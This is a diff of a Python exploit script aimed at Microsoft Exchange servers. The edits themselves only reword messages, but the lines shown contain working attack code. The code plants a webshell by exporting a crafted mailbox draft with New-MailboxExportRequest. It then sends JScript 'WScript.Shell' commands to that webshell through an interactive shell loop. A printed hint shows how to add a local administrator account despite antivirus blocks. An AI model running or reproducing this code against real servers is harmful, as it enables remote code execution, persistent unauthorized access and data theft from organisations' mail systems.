@@ -321,7 +321,7 @@ def exec_cmd(shell_url, code="exec_code"):
             print(req_test.text.split('!BD')[0].split('\n')[0])
             while True:
                 cmd = input("SHELL> ")
-                if cmd.lower() == 'exit':
+                if cmd.lower() in ['exit', 'quit']:
                 	exit(0)
                 shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
                 shell_req = requests.post(shell_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
@@ -330,9 +330,9 @@ def exec_cmd(shell_url, code="exec_code"):
                 elif shell_req.status_code == 500:
                     print('av block exec command or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
                 else:
-                    print('shell', shell_req)
+                    print('webshell ', shell_req)
         else:
-            print('shell', req_test)
+            print('webshell ', req_test)
     except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
         print("target timeout")
         exit(0)
@@ -387,14 +387,14 @@ def main():
     shell(f'New-MailboxExportRequest -Mailbox {email} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'{subj_}\')" -ExcludeDumpster -FilePath "{shell_path}"', local_port)
     time.sleep(5)
     shell_url = f"{exchange_url}{path}{file_name}"
-    print(f"path shell at {shell_url}")
+    print(f"webshell path at {shell_url}")
     for i in range(0, 10):
         f = requests.get(f"{shell_url}", verify=False)
         if f.status_code == 200:
-            print(f"got shell {f}")
+            print(f"got webshell {f}")
             exec_cmd(shell_url)
         else:
-            print('got shell ' + str(f))
+            print('got webshell ' + str(f))
         time.sleep(5)
     while True:
         ps = input("PS> ")
